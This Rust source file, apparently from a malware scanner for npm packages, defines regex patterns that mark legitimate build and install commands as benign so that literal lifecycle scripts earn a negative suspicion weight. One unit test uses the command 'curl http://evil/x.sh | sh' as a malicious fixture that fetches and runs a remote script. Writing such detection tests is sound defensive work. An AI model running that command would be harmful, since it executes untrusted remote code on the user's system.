//! Benign-pattern catalogue.
//!
//! A curated set of regex patterns matching legitimate build/install/dev
//! commands. When a `ProcessExec` whose argument is a literal command string
//! matches one of these, the composite scorer awards a **negative weight**
//! — this is how we stop `node-gyp rebuild`-style lifecycle scripts from
//! being flagged as malware.
//!
//! **Strict precondition**: we only match against `DataSource::Literal`
//! commands. Any dynamic / tainted / concatenated command is ignored — a
//! package cannot earn benign credit by *pretending* to look like a build
//! tool while actually assembling the command from attacker-controlled
//! input.

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use vk_ir::{DataSource, IrNode, IrNodeKind};

// ── Pattern list ──────────────────────────────────────────────────────────────

/// Category + regex for each benign command pattern.
struct BenignPattern {
    category: &'static str,
    regex: Regex,
    description: &'static str,
}

static BENIGN_PATTERNS: Lazy<Vec<BenignPattern>> = Lazy::new(|| {
    let raw: &[(&str, &str, &str)] = &[
        ("native_rebuild",
            r"^\s*(?:npx\s+)?node-gyp\s+(?:rebuild|configure|build|clean|install)\b",
            "node-gyp rebuild/build"),
        ("native_rebuild",
            r"^\s*prebuild-install(?:\s|$)",
            "prebuild-install"),
        ("native_rebuild",
            r"^\s*node-pre-gyp\s+(?:install|rebuild)\b",
            "node-pre-gyp install"),
        ("native_rebuild",
            r"^\s*electron-rebuild(?:\s|$)",
            "electron-rebuild"),
        ("native_rebuild",
            r"^\s*prebuildify(?:\s|$)",
            "prebuildify"),
        ("npm_tooling",
            r"^\s*npm\s+rebuild(?:\s|$)",
            "npm rebuild"),
        ("git_hooks",
            r"^\s*husky(?:\s+install)?\s*$",
            "husky install"),
        ("patch_workflow",
            r"^\s*patch-package\s*$",
            "patch-package"),
        ("patch_workflow",
            r"^\s*yarn\s+patch(?:\s|$)",
            "yarn patch"),
        ("self_test",
            r"^\s*node\s+\S+test\S*\.js\s*$",
            "node test.js"),
        ("type_generation",
            r"^\s*tsc(?:\s|$)",
            "tsc"),
        ("type_generation",
            r"^\s*tsc\s+--",
            "tsc with flags"),
    ];
    raw.iter()
        .filter_map(|(cat, pat, desc)| {
            Regex::new(pat).ok().map(|regex| BenignPattern {
                category: cat,
                regex,
                description: desc,
            })
        })
        .collect()
});

// ── Match record ──────────────────────────────────────────────────────────────

/// A single benign-pattern match tied to a specific IR node.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BenignMatch {
    pub node_id: String,
    pub category: String,
    pub description: String,
    pub matched_command: String,
    pub file: String,
    pub line: u32,
}

// ── Matching ──────────────────────────────────────────────────────────────────

/// Collect all benign-pattern matches across the IR.
///
/// A match is only recorded when:
/// 1. the node is a `ProcessExec`,
/// 2. its `arg_source` is fully literal (`DataSource::is_fully_literal()`),
/// 3. and its literal command matches at least one benign pattern.
pub fn collect_benign_matches(nodes: &[IrNode]) -> Vec<BenignMatch> {
    let mut out = Vec::new();

    for node in nodes {
        let IrNodeKind::ProcessExec { command, arg_source } = &node.kind else {
            continue;
        };

        // Must be fully literal — no benign credit for dynamic commands.
        if !arg_source.is_fully_literal() {
            continue;
        }

        // Prefer the DataSource::Literal value (most faithful).
        let cmd = match arg_source {
            DataSource::Literal { value } => value.clone(),
            DataSource::TemplateOnly { segments } => segments.concat(),
            _ => command.clone().unwrap_or_default(),
        };
        if cmd.is_empty() {
            continue;
        }

        for pattern in BENIGN_PATTERNS.iter() {
            if pattern.regex.is_match(&cmd) {
                out.push(BenignMatch {
                    node_id: node.id.clone(),
                    category: pattern.category.to_string(),
                    description: pattern.description.to_string(),
                    matched_command: cmd.clone(),
                    file: node.location.file.clone(),
                    line: node.location.line,
                });
                // One match per node is enough — avoid double-counting the
                // same ProcessExec across overlapping rules.
                break;
            }
        }
    }

    // Stable order for deterministic output.
    out.sort_by(|a, b| {
        a.file
            .cmp(&b.file)
            .then(a.line.cmp(&b.line))
            .then(a.category.cmp(&b.category))
    });
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use vk_ir::{SourceLocation};

    fn mk(cmd: &str, ds: DataSource) -> IrNode {
        IrNode::new(
            IrNodeKind::ProcessExec {
                command: Some(cmd.to_string()),
                arg_source: ds,
            },
            SourceLocation { file: "x.js".into(), line: 1, col: 1 },
        )
    }

    #[test]
    fn node_gyp_rebuild_is_benign() {
        let n = mk(
            "node-gyp rebuild",
            DataSource::Literal { value: "node-gyp rebuild".into() },
        );
        let matches = collect_benign_matches(&[n]);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].category, "native_rebuild");
    }

    #[test]
    fn dynamic_command_gets_no_benign_credit() {
        let n = mk(
            "node-gyp rebuild",
            DataSource::Concatenation {
                sources: vec![
                    DataSource::Literal { value: "node-gyp ".into() },
                    DataSource::EnvVar { name: Some("ACTION".into()) },
                ],
            },
        );
        let matches = collect_benign_matches(&[n]);
        assert!(matches.is_empty());
    }

    #[test]
    fn random_malicious_exec_does_not_match() {
        let n = mk(
            "curl http://evil/x.sh | sh",
            DataSource::Literal {
                value: "curl http://evil/x.sh | sh".into(),
            },
        );
        let matches = collect_benign_matches(&[n]);
        assert!(matches.is_empty());
    }
}
